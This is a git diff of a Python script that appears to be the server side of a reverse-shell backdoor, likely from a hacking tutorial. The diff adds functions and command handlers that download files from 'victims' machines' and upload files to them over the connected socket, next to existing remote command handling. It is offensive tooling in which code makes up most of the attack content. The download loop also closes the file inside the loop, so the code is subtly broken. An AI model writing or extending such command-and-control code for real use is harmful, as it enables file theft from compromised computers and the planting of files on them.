@@ -31,7 +31,40 @@ def reliable_recv():
             # We continue the execution
             print(f'Error occurred: {e}\nContinuing...')
             continue
-
+        
+# Allow Server to upwnload files to victims
+# Similar to upload_file(file_name): in client.py
+def upload_file(file_name):
+    # open File from 'file_name' => command[9:]
+    # read btyes
+    f = open(file_name, 'rb')
+    target.send(f.read())
+          
+# SERVER download files from victims' machines
+# Callback used to download files from victims' machines
+# Server => download files from victims' machines
+# Client => upload files to Server
+def download_file(file_name):
+    # open file object 'f' using 
+    # 'wb' => write bytes to a file
+    f = open(file_name, 'wb')    
+    # If timeout is NOT set, sometimes program will get stuck
+    target.settimeout(1)
+    # Receive data from multiple chunks
+    chunk = target.recv(1024)
+    # As long as there's something in chunk variable
+    while chunk:
+        # Writing the chunk into file
+        f.write(chunk)
+        try:
+            chunk = target.recv(1024)
+        # If there's any errors => reached End of file
+        except socket.timeout as e:
+            break
+        target.settimeout(None)
+        # Close file upon complete sending files from victims
+        f.close()
+    
 def target_communication():
     while True:
         # Once we type in str(ip)
@@ -53,6 +86,19 @@ def target_communication():
         # Executing 'clear' on Server
         elif command == 'clear':
             os.system('clear')
+        # 'vim' command
+        elif command[:4] == 'vim ':
+            pass
+        # Download files from victims' machines to this SERVER
+        # 'download path/file.txt'
+        # If first 8 CHAR == 'download'
+        elif command[:8] == 'download':
+            # FILE starts from 9th CHAR of command
+            download_file(command[9:])
+        # Upload files to victims' machine from this SERVER
+        elif command[:6] == 'upload':
+            # File starts from 7th CHAR till end
+            upload_file(command[7:])
         else:
             # A callback
             # To receive results from victims once we fire our commands
@@ -60,6 +106,7 @@ def target_communication():
             # Printing result from reliable_recv() to Server screen
             # return json.loads(data)
             print(result)
+    
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # Binding our Server IP to the PORT
